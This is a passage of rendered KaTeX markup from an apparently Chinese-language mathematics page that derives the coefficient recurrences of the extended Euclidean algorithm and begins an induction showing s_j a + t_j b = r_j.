class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">联系递推式</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">得到等式</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9028em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord mathnormal">b</span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋))</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8234em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟹</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.095em;vertical-align:-0.345em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mopen">⌊</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">⌋</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord">&#x2F;</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mclose">⌋</span></span></span></span><br><strong>那么现在只需证明:</strong><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>对</mtext><mi>j</mi><mo>&#x3D;</mo><mo>−</mo><mn>2</mn><mo separator="true">,</mo><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mtext>，</mtext><mspace linebreak="newline"></mspace><msub><mi>s</mi><mi>j</mi></msub><mi>a</mi><mo>+</mo><msub><mi>t</mi><mi>j</mi></msub><mi>b</mi><mo>&#x3D;</mo><msub><mi>r</mi><mi>j</mi></msub><mo separator="true">,</mo><mtext>其中</mtext><msub><mi>r</mi><mi>j</mi></msub><mo>&#x3D;</mo><msub><mi>r</mi><mrow><mi>j</mi><mo>−</mo><mn>2</mn></mrow></msub><mo>−</mo><msub><mi>q</mi><mi>j</mi></msub><msub><mi>r</mi><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">对j&#x3D;-2,-1,0,1,…,n-1，\newline<br>s_ja+t_jb&#x3D;r_j,其中r_j&#x3D;r_{j-2}-q_jr_{j-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord cjk_fallback">对</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">…</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">其中</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 